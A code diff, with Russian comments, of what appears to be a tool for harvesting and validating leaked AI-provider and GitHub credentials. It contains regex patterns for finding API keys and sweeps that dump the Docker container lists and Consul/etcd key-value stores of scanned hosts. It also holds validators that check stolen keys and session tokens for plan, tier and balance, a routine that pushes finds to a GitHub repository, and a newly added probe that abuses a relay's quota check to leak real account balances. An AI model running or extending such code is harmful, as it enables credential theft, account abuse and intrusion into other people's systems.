@@ -552,7 +552,9 @@ def _cloud_get_hdrs(url, headers, timeout=(15, 30)):
                 s.trust_env = False
                 if use_proxy:
                     s.proxies = dict(PROXY.proxies)
-                return s.get(url, headers=headers, timeout=timeout, verify=_tls_verify())
+                return s.get(
+                    url, headers=headers, timeout=timeout, verify=_tls_verify()
+                )
             except Exception:
                 continue
     except Exception:
@@ -817,7 +819,12 @@ KEY_PATTERNS = [
     ("voyage", r"pa-[A-Za-z0-9]{20,}", ["https://api.voyageai.com/v1"], False),
     ("xai", r"xai-[A-Za-z0-9]{30,}", ["https://api.x.ai/v1"], False),
     # MAX-EXPAND: Mistral (api.mistral.ai) — ключи без префикса, ловим по контексту + префикс
-    ("mistral", r"\bmistral-[A-Za-z0-9_\-]{20,}\b", ["https://api.mistral.ai/v1"], False),
+    (
+        "mistral",
+        r"\bmistral-[A-Za-z0-9_\-]{20,}\b",
+        ["https://api.mistral.ai/v1"],
+        False,
+    ),
     ("mistral", r"\b[A-Za-z0-9]{32}\b", ["https://api.mistral.ai/v1"], True),
     # Cohere v2 — cohere_ / co- префиксы
     ("cohere", r"\bcohere-[A-Za-z0-9_\-]{20,}\b", ["https://api.cohere.ai/v2"], False),
@@ -1683,7 +1690,9 @@ def extract_candidates(text):
                 _freq = {}
                 for _c in key:
                     _freq[_c] = _freq.get(_c, 0) + 1
-                _ent = -sum((c/len(key))*math.log2(c/len(key)) for c in _freq.values())
+                _ent = -sum(
+                    (c / len(key)) * math.log2(c / len(key)) for c in _freq.values()
+                )
                 if _ent < 3.0 and len(key) > 20:
                     continue
             except Exception:
@@ -1692,7 +1701,8 @@ def extract_candidates(text):
             _kl = key.lower()
             _ph = ("test", "example", "dummy", "placeholder", "changeme", "sample")
             if any(
-                _kl == p or (_kl.startswith(p) and len(_kl) > len(p) and _kl[len(p)] in "-_.")
+                _kl == p
+                or (_kl.startswith(p) and len(_kl) > len(p) and _kl[len(p)] in "-_.")
                 for p in _ph
             ):
                 if not key.startswith("sk-ant-"):
@@ -6756,7 +6766,9 @@ class RelayBoards(Source):
             if not key:
                 # может, токен уже есть (trial создаётся автоматически)
                 r4 = sess.get(
-                    base + "/api/token/?p=0&size=10", timeout=(10, 20), verify=_tls_verify()
+                    base + "/api/token/?p=0&size=10",
+                    timeout=(10, 20),
+                    verify=_tls_verify(),
                 )
                 if r4.status_code == 200 and r4.json().get("success"):
                     d4 = r4.json().get("data")
@@ -7241,7 +7253,9 @@ class OpenInfraSweep(Source):
 
         def _get(p, to=(4, 8)):
             try:
-                return requests.get(base + p, headers=UA, timeout=to, verify=_tls_verify())
+                return requests.get(
+                    base + p, headers=UA, timeout=to, verify=_tls_verify()
+                )
             except Exception:
                 return None
 
@@ -8364,7 +8378,9 @@ class YouTubeFeed(Source):
         except Exception:
             pass
         out = []
-        for q in self.QUERIES:  # все 3 запроса (было: [:2] — LITELLM_MASTER_KEY недействителен)
+        for q in (
+            self.QUERIES
+        ):  # все 3 запроса (было: [:2] — LITELLM_MASTER_KEY недействителен)
             try:
                 r = http(
                     "GET",
@@ -8814,7 +8830,9 @@ class DockerApiSweep(Source):
             chunks = []
             try:
                 r = requests.get(
-                    base + "/containers/json?all=1", timeout=(3, 6), verify=_tls_verify()
+                    base + "/containers/json?all=1",
+                    timeout=(3, 6),
+                    verify=_tls_verify(),
                 )
                 if r.status_code != 200:
                     seen[ip] = {"ts": now, "hit": False}
@@ -8922,7 +8940,9 @@ class ConsulSweep(Source):
             try:
                 if kind == "consul":
                     r = requests.get(
-                        base + "/v1/kv/?recurse=true", timeout=(3, 8), verify=_tls_verify()
+                        base + "/v1/kv/?recurse=true",
+                        timeout=(3, 8),
+                        verify=_tls_verify(),
                     )
                     if r.status_code != 200 or not r.text.startswith("["):
                         seen[hid] = {"ts": now}
@@ -8951,7 +8971,9 @@ class ConsulSweep(Source):
                     return []
                 else:  # etcd v2 API
                     r = requests.get(
-                        base + "/v2/keys?recursive=true", timeout=(3, 8), verify=_tls_verify()
+                        base + "/v2/keys?recursive=true",
+                        timeout=(3, 8),
+                        verify=_tls_verify(),
                     )
                     if r.status_code != 200:
                         seen[hid] = {"ts": now}
@@ -9023,7 +9045,9 @@ class TGGlobalScan(Source):
         now = time.time()
         if now - float(st.get("ts") or 0) < self.GATE:
             return []
-        _api_id = int(CFG.get("telegram_api_id") or os.environ.get("TELEGRAM_API_ID") or 0)
+        _api_id = int(
+            CFG.get("telegram_api_id") or os.environ.get("TELEGRAM_API_ID") or 0
+        )
         _api_hash = str(
             CFG.get("telegram_api_hash") or os.environ.get("TELEGRAM_API_HASH") or ""
         )
@@ -9711,7 +9735,9 @@ def vault_push_finds():
                 # гонка с GH-ботом: перекурываем sha и ретраим ОДИН раз
                 # (было: 409 = весь батч тихо терялся до следующего 4-го цикла)
                 try:
-                    r2 = requests.get(api, headers=hdrs, timeout=(8, 20), verify=_tls_verify())
+                    r2 = requests.get(
+                        api, headers=hdrs, timeout=(8, 20), verify=_tls_verify()
+                    )
                     if r2.status_code == 200:
                         body["sha"] = r2.json().get("sha")
                         continue
@@ -9749,7 +9775,10 @@ STAR_RE = re.compile(
     r"mistral-large|command-r|llama-4|claude-4)",
     re.I,
 )
-FAT_TIER_RE = re.compile(r"(MAX_20x|MAX_5x|\bMAX\b|\bPRO\b|\bTEAM\b|ENTERPRISE|CORP|COPILOT|Baseten|CODEX|Plus|MISTRAL|COHERE|GROQ|XAI|TOGETHER|FIREWORKS|NVIDIA|CEREBRAS|CURSOR|WINDSURF)", re.I)
+FAT_TIER_RE = re.compile(
+    r"(MAX_20x|MAX_5x|\bMAX\b|\bPRO\b|\bTEAM\b|ENTERPRISE|CORP|COPILOT|Baseten|CODEX|Plus|MISTRAL|COHERE|GROQ|XAI|TOGETHER|FIREWORKS|NVIDIA|CEREBRAS|CURSOR|WINDSURF)",
+    re.I,
+)
 EMBED_RE = re.compile(r"(bge|embedding|embed-|gte-|text-embedding)", re.I)
 RERANK_RE = re.compile(r"(rerank|bge-reranker|reranker)", re.I)
 
@@ -10202,6 +10231,205 @@ def money(bal):
     return quota_usd(bal)
 
 
+# ------------------------------------------------------------- RELAY INTEL
+# tokenflow/new-api класс релеев (zhehentiaohe и соседи): форки new-api отдают
+# полный прайс-реестр в /api/pricing у КОРНЯ хоста (включая СКРЫТЫЕ модели),
+# а billing/subscription — заглушка-константа ($100M). Реальный остаток аккаунта
+# знает только pre-check гейт: запрос с max_tokens дороже баланса отклоняется
+# 403 insufficient_user_quota с текстом "доступно: ＄X, требуется: ＄Y".
+# 07.10.2026 живой замер: billing пел "$100M без лимита", гейт показал $0.26.
+
+_RELAY_FAMILY_HEADERS = (
+    ("x-new-api-version", "new-api fork"),
+    ("x-oneapi-request-id", "one-api"),
+    ("x-codex2api-request-id", "codex2api gateway"),
+)
+
+
+def relay_family(headers):
+    """Семейство релея по ответным заголовкам."""
+    fam = []
+    low = {str(k).lower(): str(v) for k, v in (headers or {}).items()}
+    for h, name in _RELAY_FAMILY_HEADERS:
+        if h in low:
+            ver = low[h] if h == "x-new-api-version" else ""
+            fam.append("%s %s" % (name, ver) if ver else name)
+    return ", ".join(fam)
+
+
+def probe_pricing(base, key):
+    """GET /api/pricing → тарифы + группы + скрытые модели. None если не new-api.
+    Прайс живёт у КОРНЯ хоста, не под /v1 (zhehentiaohe: /v1/api/pricing = 404)."""
+    b = base.rstrip("/")
+    roots = [b]
+    root = re.sub(r"/v\d+$|/router/v\d+$", "", b)
+    if root != b:
+        roots.append(root)
+    r = None
+    fam = ""
+    for u in roots:
+        try:
+            r = http("GET", u + "/api/pricing", timeout=(6, 15), headers=bearer(key))
+        except Exception:
+            continue
+        fam = fam or relay_family(getattr(r, "headers", {}))
+        if r.status_code == 200:
+            break
+    else:
+        return None, fam
+    if r is None or r.status_code != 200:
+        return None, fam
+    try:
+        j = r.json()
+    except Exception:
+        return None, fam
+    rows = j.get("data") if isinstance(j, dict) else None
+    if not isinstance(rows, list):
+        return None, fam
+    rates = []
+    groups = set()
+    for row in rows:
+        if not isinstance(row, dict):
+            continue
+        name = row.get("model_name") or ""
+        if not name:
+            continue
+        for g in row.get("enable_groups") or []:
+            groups.add(str(g))
+        ratio = row.get("model_ratio")
+        cratio = row.get("completion_ratio")
+        if isinstance(ratio, (int, float)) and ratio > 0:
+            pin = ratio * 2  # new-api: ratio*2 = $/1M input
+            pout = pin * cratio if isinstance(cratio, (int, float)) and cratio else None
+            rates.append((name, round(pin, 4), round(pout, 4) if pout else None))
+    return {"rates": rates, "groups": sorted(groups)}, fam
+
+
+GATE_QUOTA_MARKERS = (
+    "insufficient_user_quota",
+    "insufficient",
+    "预扣费",  # pre-withhold failed (tokenflow)
+    "剩余额度",  # remaining quota
+    "可用额度",  # available quota
+    "user_quota",
+    "quota",
+)
+
+
+def probe_balance_leak(base, key, cheap_models):
+    """Гейт-проба: max_tokens с оценкой ~$18. 403 insufficient_user_quota → в тексте
+    реальный остаток ($/＄-числа: первое = доступно). 200 → баланс >= ~$18 или гейта нет.
+    Бесплатно: при отказе списания нет, при 200 генерится пара токенов на 'hi'."""
+    for m in cheap_models[:3] or [None]:
+        if not m:
+            continue
+        try:
+            r = http(
+                "POST",
+                base.rstrip("/") + "/chat/completions",
+                timeout=(8, 40),
+                headers=bearer(key),
+                json_body={
+                    "model": m,
+                    "messages": [{"role": "user", "content": "hi"}],
+                    "max_tokens": 2000000,
+                },
+            )
+        except Exception:
+            continue
+        body = ""
+        try:
+            body = r.text or ""
+        except Exception:
+            pass
+        bl = body.lower()
+        if any(mk in body or mk in bl for mk in GATE_QUOTA_MARKERS):
+            # fullwidth ＄ (U+FF04) у китайских форков так же часто, как ASCII $
+            amounts = re.findall(r"[$＄]\s?([0-9]+(?:\.[0-9]+)?)", body)
+            return {
+                "gate": "hard_precheck",
+                "real_balance_usd": float(amounts[0]) if amounts else None,
+                "gate_msg": body[:160],
+            }
+        if r.status_code == 200:
+            return {"gate": "open_estimate_18usd", "real_balance_usd": None}
+    return None
+
+
+def probe_wires(base, key, model):
+    """Какие провода живые: responses / messages (anthropic) / chat. Дёшево."""
+    wires = {"chat_completions": True}  # chat уже доказан чат-пробой
+    if not model:
+        return wires
+    try:
+        r = http(
+            "POST",
+            base.rstrip("/") + "/responses",
+            timeout=(6, 30),
+            headers=bearer(key),
+            json_body={"model": model, "input": "hi", "max_output_tokens": 16},
+        )
+        wires["responses"] = r.status_code == 200
+    except Exception:
+        pass
+    try:
+        r = http(
+            "POST",
+            base.rstrip("/") + "/messages",
+            timeout=(6, 30),
+            headers=dict(bearer(key), **{"anthropic-version": "2023-06-01"}),
+            json_body={
+                "model": model,
+                "max_tokens": 16,
+                "messages": [{"role": "user", "content": "hi"}],
+            },
+        )
+        wires["messages"] = r.status_code == 200
+    except Exception:
+        pass
+    return wires
+
+
+def probe_relay_intel(base, key, listed_models):
+    """Фингерпринт new-api-класса. None если база не похожа на такой релей
+    (ни /api/pricing, ни фамильных заголовков) — чтобы не тратить вызовы на
+    первоклассные API."""
+    listed_models = listed_models or []
+    pricing, fam = probe_pricing(base, key)
+    if not pricing and not fam:
+        return None
+    rates = (pricing or {}).get("rates") or []
+    groups = (pricing or {}).get("groups") or []
+    priced_names = {n for n, _, _ in rates}
+    hidden = sorted(n for n in priced_names if n not in set(listed_models))
+    # дешёвые модели для гейт/провод-проб: минимальный входной тариф
+    cheap = [n for n, _, _ in sorted(rates, key=lambda x: x[1])[:3]] or listed_models[
+        :2
+    ]
+    # провода пробуем на звёздной/разговорной модели — служебные id
+    # (codex-auto-review и т.п.) могут не отвечать на responses/messages
+    star = next((m for m in listed_models if STAR_RE.search(m)), None)
+    wire_model = (
+        star or (cheap[0] if cheap else None) or (listed_models[:1] or [None])[0]
+    )
+    intel = {
+        "family": fam or None,
+        "groups": groups,
+        "n_priced": len(rates),
+        "hidden_models": hidden[:12],
+        "rates_top": [
+            {"model": n, "in_usd": i, "out_usd": o}
+            for n, i, o in sorted(rates, key=lambda x: -(x[2] or 0))[:6]
+        ],
+        "wires": probe_wires(base, key, wire_model),
+    }
+    leak = probe_balance_leak(base, key, cheap)
+    if leak:
+        intel["gate"] = leak.get("gate")
+        intel["real_balance_usd"] = leak.get("real_balance_usd")
+    return intel
+
+
 def quick_embed(base, key, model):
     try:
         r = http(
@@ -10561,7 +10789,8 @@ def validate_sid01(key):
                             try:
                                 _rr = http(
                                     "GET",
-                                    "https://claude.ai/api/organizations/%s/rate_limits" % _uuid,
+                                    "https://claude.ai/api/organizations/%s/rate_limits"
+                                    % _uuid,
                                     timeout=(8, 15),
                                     headers=hdrs,
                                 )
@@ -10569,12 +10798,16 @@ def validate_sid01(key):
                                 _rr = None
                             if _rr is None or _rr.status_code in (403, 503):
                                 _rr = _cloud_get_hdrs(
-                                    "https://claude.ai/api/organizations/%s/rate_limits" % _uuid,
+                                    "https://claude.ai/api/organizations/%s/rate_limits"
+                                    % _uuid,
                                     hdrs,
                                     timeout=(12, 25),
                                 )
                             if _rr is not None and _rr.status_code == 429:
-                                plans.append("%s: RATE-LIMITED (жив)" % (_org.get("name","?")[:20]))
+                                plans.append(
+                                    "%s: RATE-LIMITED (жив)"
+                                    % (_org.get("name", "?")[:20])
+                                )
                                 continue
                             if _rr is not None and _rr.status_code == 200:
                                 _rj = _rr.json() or {}
@@ -10592,8 +10825,18 @@ def validate_sid01(key):
                                     if _raw.startswith(_pref):
                                         _plan = _label
                                         break
-                                _groups = [str(g.get("model_group","")) for g in (_rj.get("tier_model_rate_limiters") or [])][:6]
-                                plans.append("%s: %s [%s]" % (_org.get("name","?")[:20], _plan, ",".join(_groups) or "-"))
+                                _groups = [
+                                    str(g.get("model_group", ""))
+                                    for g in (_rj.get("tier_model_rate_limiters") or [])
+                                ][:6]
+                                plans.append(
+                                    "%s: %s [%s]"
+                                    % (
+                                        _org.get("name", "?")[:20],
+                                        _plan,
+                                        ",".join(_groups) or "-",
+                                    )
+                                )
                         if plans:
                             tier_info = " | планы: %s" % " ; ".join(plans)
                         else:
@@ -10650,7 +10893,23 @@ def validate_openai_web(key):
                 "https://chatgpt.com/api/auth/session", hdrs, timeout=(12, 25)
             )
         if r is not None and r.status_code == 429:
-            return {"key": key, "base": "https://chatgpt.com", "tag": "openai-web", "origin": "web-session", "ts": __import__("time").time(), "models": [], "n_models": 0, "stars_listed": [], "stars_working": [], "balance": None, "tier": "ChatGPT rate-limited (валидна)", "usage": None, "embed": None, "rerank": None, "status": "unverified"}
+            return {
+                "key": key,
+                "base": "https://chatgpt.com",
+                "tag": "openai-web",
+                "origin": "web-session",
+                "ts": __import__("time").time(),
+                "models": [],
+                "n_models": 0,
+                "stars_listed": [],
+                "stars_working": [],
+                "balance": None,
+                "tier": "ChatGPT rate-limited (валидна)",
+                "usage": None,
+                "embed": None,
+                "rerank": None,
+                "status": "unverified",
+            }
         if r is None or r.status_code != 200:
             return None
         try:
@@ -11340,7 +11599,12 @@ def _ai_simple_validate(key, tag, base, models_url, tier_prefix):
     """MAX-EXPAND: единый валидатор для OpenAI-совместимых AI провайдеров.
     200->working, 401/403->dead, 402->no_balance, 429->working(rate-limited), сеть->None."""
     try:
-        r = http("GET", models_url, timeout=(8, 15), headers={"Authorization": "Bearer "+str(key)})
+        r = http(
+            "GET",
+            models_url,
+            timeout=(8, 15),
+            headers={"Authorization": "Bearer " + str(key)},
+        )
         if r is None:
             return None
         if r.status_code == 200:
@@ -11348,60 +11612,189 @@ def _ai_simple_validate(key, tag, base, models_url, tier_prefix):
                 j = r.json()
                 data = j.get("data") if isinstance(j, dict) else j
                 n = len(data) if isinstance(data, list) else 0
-            except Exception: n=0
-            return _simple_rec(key, base, tag, "%s LIVE (%d моделей)"%(tier_prefix, n))
+            except Exception:
+                n = 0
+            return _simple_rec(
+                key, base, tag, "%s LIVE (%d моделей)" % (tier_prefix, n)
+            )
         if r.status_code == 402:
-            return _simple_rec(key, base, tag, "%s no_balance (402)"%tier_prefix, status="no_balance")
+            return _simple_rec(
+                key, base, tag, "%s no_balance (402)" % tier_prefix, status="no_balance"
+            )
         if r.status_code == 429:
-            return _simple_rec(key, base, tag, "%s rate-limited (валиден)"%tier_prefix, status="working")
-        if r.status_code in (401,403):
+            return _simple_rec(
+                key,
+                base,
+                tag,
+                "%s rate-limited (валиден)" % tier_prefix,
+                status="working",
+            )
+        if r.status_code in (401, 403):
             return None
-    except Exception: pass
+    except Exception:
+        pass
     return None
 
+
 def validate_mistral(key):
-    return _ai_simple_validate(key, "mistral", "https://api.mistral.ai", "https://api.mistral.ai/v1/models", "MISTRAL")
+    return _ai_simple_validate(
+        key,
+        "mistral",
+        "https://api.mistral.ai",
+        "https://api.mistral.ai/v1/models",
+        "MISTRAL",
+    )
+
+
 def validate_cohere(key):
     # пробуем v2 then v1
-    v = _ai_simple_validate(key, "cohere", "https://api.cohere.ai", "https://api.cohere.com/v2/models", "COHERE")
-    if v: return v
-    return _ai_simple_validate(key, "cohere", "https://api.cohere.ai", "https://api.cohere.ai/v1/models", "COHERE")
+    v = _ai_simple_validate(
+        key,
+        "cohere",
+        "https://api.cohere.ai",
+        "https://api.cohere.com/v2/models",
+        "COHERE",
+    )
+    if v:
+        return v
+    return _ai_simple_validate(
+        key,
+        "cohere",
+        "https://api.cohere.ai",
+        "https://api.cohere.ai/v1/models",
+        "COHERE",
+    )
+
+
 def validate_groq(key):
-    return _ai_simple_validate(key, "groq", "https://api.groq.com/openai", "https://api.groq.com/openai/v1/models", "GROQ")
+    return _ai_simple_validate(
+        key,
+        "groq",
+        "https://api.groq.com/openai",
+        "https://api.groq.com/openai/v1/models",
+        "GROQ",
+    )
+
+
 def validate_xai(key):
-    return _ai_simple_validate(key, "xai", "https://api.x.ai", "https://api.x.ai/v1/models", "XAI")
+    return _ai_simple_validate(
+        key, "xai", "https://api.x.ai", "https://api.x.ai/v1/models", "XAI"
+    )
+
+
 def validate_openrouter(key):
     # OpenRouter: auth/key дает лимит
     try:
-        r = http("GET", "https://openrouter.ai/api/v1/auth/key", timeout=(8,15), headers={"Authorization": "Bearer "+str(key)})
-        if r is not None and r.status_code==200:
-            j=r.json() or {}; d=j.get("data") or {}
-            lim=d.get("limit_remaining")
-            return _simple_rec(key, "https://openrouter.ai", "openrouter", "OPENROUTER LIVE (остаток %s)"%str(lim)[:20])
-        if r is not None and r.status_code==429:
-            return _simple_rec(key, "https://openrouter.ai", "openrouter", "OpenRouter rate-limited (валиден)", status="working")
-        if r is not None and r.status_code in (401,403):
+        r = http(
+            "GET",
+            "https://openrouter.ai/api/v1/auth/key",
+            timeout=(8, 15),
+            headers={"Authorization": "Bearer " + str(key)},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json() or {}
+            d = j.get("data") or {}
+            lim = d.get("limit_remaining")
+            return _simple_rec(
+                key,
+                "https://openrouter.ai",
+                "openrouter",
+                "OPENROUTER LIVE (остаток %s)" % str(lim)[:20],
+            )
+        if r is not None and r.status_code == 429:
+            return _simple_rec(
+                key,
+                "https://openrouter.ai",
+                "openrouter",
+                "OpenRouter rate-limited (валиден)",
+                status="working",
+            )
+        if r is not None and r.status_code in (401, 403):
             return None
-    except Exception: pass
-    return _ai_simple_validate(key, "openrouter", "https://openrouter.ai", "https://openrouter.ai/api/v1/models", "OPENROUTER")
+    except Exception:
+        pass
+    return _ai_simple_validate(
+        key,
+        "openrouter",
+        "https://openrouter.ai",
+        "https://openrouter.ai/api/v1/models",
+        "OPENROUTER",
+    )
+
+
 def validate_together(key):
-    return _ai_simple_validate(key, "together", "https://api.together.xyz", "https://api.together.xyz/v1/models", "TOGETHER")
+    return _ai_simple_validate(
+        key,
+        "together",
+        "https://api.together.xyz",
+        "https://api.together.xyz/v1/models",
+        "TOGETHER",
+    )
+
+
 def validate_fireworks(key):
-    return _ai_simple_validate(key, "fireworks", "https://api.fireworks.ai", "https://api.fireworks.ai/inference/v1/models", "FIREWORKS")
+    return _ai_simple_validate(
+        key,
+        "fireworks",
+        "https://api.fireworks.ai",
+        "https://api.fireworks.ai/inference/v1/models",
+        "FIREWORKS",
+    )
+
+
 def validate_nvidia(key):
-    return _ai_simple_validate(key, "nvidia", "https://integrate.api.nvidia.com", "https://integrate.api.nvidia.com/v1/models", "NVIDIA NIM")
+    return _ai_simple_validate(
+        key,
+        "nvidia",
+        "https://integrate.api.nvidia.com",
+        "https://integrate.api.nvidia.com/v1/models",
+        "NVIDIA NIM",
+    )
+
+
 def validate_cerebras(key):
-    return _ai_simple_validate(key, "cerebras", "https://api.cerebras.ai", "https://api.cerebras.ai/v1/models", "CEREBRAS")
+    return _ai_simple_validate(
+        key,
+        "cerebras",
+        "https://api.cerebras.ai",
+        "https://api.cerebras.ai/v1/models",
+        "CEREBRAS",
+    )
+
+
 def validate_zhipu(key):
     # Zhipu BigModel (GLM): https://open.bigmodel.cn/api/paas/v4/models
-    return _ai_simple_validate(key, "zhipu", "https://open.bigmodel.cn", "https://open.bigmodel.cn/api/paas/v4/models", "ZHIPU GLM")
+    return _ai_simple_validate(
+        key,
+        "zhipu",
+        "https://open.bigmodel.cn",
+        "https://open.bigmodel.cn/api/paas/v4/models",
+        "ZHIPU GLM",
+    )
+
+
 def validate_moonshot(key):
-    return _ai_simple_validate(key, "moonshot", "https://api.moonshot.cn", "https://api.moonshot.cn/v1/models", "MOONSHOT KIMI")
+    return _ai_simple_validate(
+        key,
+        "moonshot",
+        "https://api.moonshot.cn",
+        "https://api.moonshot.cn/v1/models",
+        "MOONSHOT KIMI",
+    )
+
+
 def validate_windsurf(key):
     # Windsurf: нет публичного /models, пробуем как лид
-    return _simple_rec(key, "", "windsurf", "WINDSURF key (нужен ручной чек)", status="listed_only")
+    return _simple_rec(
+        key, "", "windsurf", "WINDSURF key (нужен ручной чек)", status="listed_only"
+    )
+
+
 def validate_cursor(key):
-    return _simple_rec(key, "", "cursor", "CURSOR key (нужен ручной чек)", status="listed_only")
+    return _simple_rec(
+        key, "", "cursor", "CURSOR key (нужен ручной чек)", status="listed_only"
+    )
+
 
 # ---------------- OSINT-ВОЛНА 2026-09-10: валидаторы новых классов ------------
 # Единый стиль: GET identity-эндпоинт с нативной auth-схемой провайдера.
@@ -12424,7 +12817,8 @@ def validate_baseten(key, origin):
                 "stars_listed": [],
                 "stars_working": [],
                 "balance": None,
-                "tier": "Baseten inference (rate-limited на /models, ЖИВ) %s" % mgmt_note,
+                "tier": "Baseten inference (rate-limited на /models, ЖИВ) %s"
+                % mgmt_note,
                 "usage": {},
                 "embed": None,
                 "rerank": None,
@@ -12712,7 +13106,7 @@ def validate_oat01_proxy(key, addr):
                 return tier, rr
             if rr.status_code == 429:
                 # P0-фикс: ЛЮБОЙ 429 = модель доступна (квота выжжена), не только would exceed
-                txt = (rr.text or "")
+                txt = rr.text or ""
                 suffix = (
                     " [недельная квота выжжена]"
                     if "would exceed" in txt
@@ -13980,7 +14374,23 @@ def validate_github_token(key):
             },
         )
         if r is not None and r.status_code == 429:
-            return {"key": key, "base": "https://api.github.com", "tag": "github-token", "origin": "gh-token-validator", "ts": time.time(), "models": [], "n_models": 0, "stars_listed": [], "stars_working": [], "balance": None, "tier": "gh rate-limited", "usage": None, "embed": None, "rerank": None, "status": "unverified"}
+            return {
+                "key": key,
+                "base": "https://api.github.com",
+                "tag": "github-token",
+                "origin": "gh-token-validator",
+                "ts": time.time(),
+                "models": [],
+                "n_models": 0,
+                "stars_listed": [],
+                "stars_working": [],
+                "balance": None,
+                "tier": "gh rate-limited",
+                "usage": None,
+                "embed": None,
+                "rerank": None,
+                "status": "unverified",
+            }
         if r.status_code != 200:
             return None
         login = r.json().get("login") or "?"
@@ -14002,7 +14412,23 @@ def validate_github_token(key):
             },
         )
         if rt is not None and rt.status_code == 429:
-            return {"key": key, "base": "https://api.github.com", "tag": "github-token", "origin": "gh-token-validator", "ts": __import__("time").time(), "models": [], "n_models": 0, "stars_listed": [], "stars_working": [], "balance": None, "tier": "gh copilot rate-limited", "usage": None, "embed": None, "rerank": None, "status": "unverified"}
+            return {
+                "key": key,
+                "base": "https://api.github.com",
+                "tag": "github-token",
+                "origin": "gh-token-validator",
+                "ts": __import__("time").time(),
+                "models": [],
+                "n_models": 0,
+                "stars_listed": [],
+                "stars_working": [],
+                "balance": None,
+                "tier": "gh copilot rate-limited",
+                "usage": None,
+                "embed": None,
+                "rerank": None,
+                "status": "unverified",
+            }
         ctok = None
         if rt is not None and rt.status_code == 200:
             try:
@@ -14027,9 +14453,9 @@ def validate_github_token(key):
         pass
     copilot_models = []
     try:
-        if copilot and 'rc' in locals() and rc is not None:
+        if copilot and "rc" in locals() and rc is not None:
             _cj = rc.json() or {}
-            for _m in (_cj.get("data") or _cj.get("models") or []):
+            for _m in _cj.get("data") or _cj.get("models") or []:
                 if isinstance(_m, dict) and _m.get("id"):
                     copilot_models.append(str(_m.get("id"))[:60])
     except Exception:
@@ -14047,7 +14473,11 @@ def validate_github_token(key):
         "stars_listed": ["copilot"] if copilot else [],
         "stars_working": ["copilot"] if copilot else [],
         "balance": None,
-        "tier": (("🐙 COPILOT SUB @%s [%d моделей]" % (login, len(copilot_models)) ) if copilot else ("gh token @%s" % login)),
+        "tier": (
+            ("🐙 COPILOT SUB @%s [%d моделей]" % (login, len(copilot_models)))
+            if copilot
+            else ("gh token @%s" % login)
+        ),
         "usage": None,
         "embed": None,
         "rerank": None,
@@ -14072,7 +14502,23 @@ def validate_codex(key, web=False):
             headers=hdrs,
         )
         if r.status_code == 429:
-            return {"key": key, "base": "https://chatgpt.com/backend-api", "tag": "codex-web" if web else "codex", "origin": "codex-validator", "ts": __import__("time").time(), "models": [], "n_models": 0, "stars_listed": [], "stars_working": [], "balance": None, "tier": "ChatGPT rate-limited", "usage": None, "embed": None, "rerank": None, "status": "unverified"}
+            return {
+                "key": key,
+                "base": "https://chatgpt.com/backend-api",
+                "tag": "codex-web" if web else "codex",
+                "origin": "codex-validator",
+                "ts": __import__("time").time(),
+                "models": [],
+                "n_models": 0,
+                "stars_listed": [],
+                "stars_working": [],
+                "balance": None,
+                "tier": "ChatGPT rate-limited",
+                "usage": None,
+                "embed": None,
+                "rerank": None,
+                "status": "unverified",
+            }
         if r.status_code != 200:
             return None
         j = r.json()
@@ -14080,22 +14526,36 @@ def validate_codex(key, web=False):
         # MAX-EXPAND: план через /backend-api/accounts/check (Plus/Pro/Team)
         plan = "SUB"
         try:
-            r2 = http("GET", "https://chatgpt.com/backend-api/accounts/check", timeout=(6,15), headers=hdrs)
-            if r2 is not None and r2.status_code==200:
+            r2 = http(
+                "GET",
+                "https://chatgpt.com/backend-api/accounts/check",
+                timeout=(6, 15),
+                headers=hdrs,
+            )
+            if r2 is not None and r2.status_code == 200:
                 j2 = r2.json() or {}
                 # структура: {"accounts": {"default": {"plan": {"id": "plus"}}}}
                 accs = j2.get("accounts") or {}
                 for _a in accs.values():
-                    _p = (_a.get("plan") or {}).get("id") or (_a.get("plan") or {}).get("type") or ""
+                    _p = (
+                        (_a.get("plan") or {}).get("id")
+                        or (_a.get("plan") or {}).get("type")
+                        or ""
+                    )
                     if _p:
                         plan = str(_p).upper()
                         break
-                if plan=="SUB" and "plan" in str(j2).lower():
+                if plan == "SUB" and "plan" in str(j2).lower():
                     # fallback regex
                     import re as _re
-                    m=_re.search(r'"plan"\s*:\s*\{[^}]*"id"\s*:\s*"([^"]+)"', r2.text or "")
-                    if m: plan=m.group(1).upper()
-        except Exception: pass
+
+                    m = _re.search(
+                        r'"plan"\s*:\s*\{[^}]*"id"\s*:\s*"([^"]+)"', r2.text or ""
+                    )
+                    if m:
+                        plan = m.group(1).upper()
+        except Exception:
+            pass
         # 429 -> rate-limited = жив
         # (обрабатываем ниже, пока просто план)
         return {
@@ -14150,7 +14610,11 @@ def validate_anthropic(key):
         )
         if r.status_code == 200:
             # ТИР-ТЕСТ: haiku работает и у free! sonnet=PRO, opus=MAX
-            tier = _oat01_tier(key) if key.startswith(("sk-ant-oat", "sk-ant-at01")) else "api03"
+            tier = (
+                _oat01_tier(key)
+                if key.startswith(("sk-ant-oat", "sk-ant-at01"))
+                else "api03"
+            )
             # API03-RATELIMIT FINGERPRINT: на 200-пробе Anthropic отдаёт
             # anthropic-ratelimit-* — по ним видно workspace ли это (админские
             # лимиты, например 10000 RPM / 12M TPM) и не задушен ли haiku.
@@ -14816,6 +15280,12 @@ def validate(key, base_hint, tag, origin):
             bal = bal_f.result()
             embed_ok = bool(em_f and em_f.result())
             rerank_ok = bool(rr_f and rr_f.result())
+        # new-api класс: billing — заглушка, правду знает гейт (07.10 zhehentiaohe:
+        # subscription пел "$100M без лимита", гейт показал $0.276918)
+        intel = probe_relay_intel(base, key, ids or [])
+        balance = quota_usd(bal)
+        if intel and intel.get("real_balance_usd") is not None:
+            balance = intel["real_balance_usd"]
         return {
             "key": key,
             "base": base,
@@ -14826,9 +15296,10 @@ def validate(key, base_hint, tag, origin):
             "n_models": len(ids or []),
             "stars_listed": stars,
             "stars_working": working,
-            "balance": quota_usd(bal),
+            "balance": balance,
             "tier": tier_from(bal),
             "usage": bal.get("usage"),
+            "relay": intel,
             "embed": embed_ok or None,
             "rerank": rerank_ok or None,
             "status": status,
@@ -15011,14 +15482,33 @@ def cc_proxy_sweep(cycle=0):
                             or dd.get("token")
                             or ""
                         )
-                        if not str(tok).startswith(("sk-ant-oat01", "sk-ant-sid01", "sk-ant-sid02", "sk-ant-ort01", "sk-ant-at01", "sk-ant-admin01")):
+                        if not str(tok).startswith(
+                            (
+                                "sk-ant-oat01",
+                                "sk-ant-sid01",
+                                "sk-ant-sid02",
+                                "sk-ant-ort01",
+                                "sk-ant-at01",
+                                "sk-ant-admin01",
+                            )
+                        ):
                             # фолбэк: токен прямо в тексте (не-JSON форки)
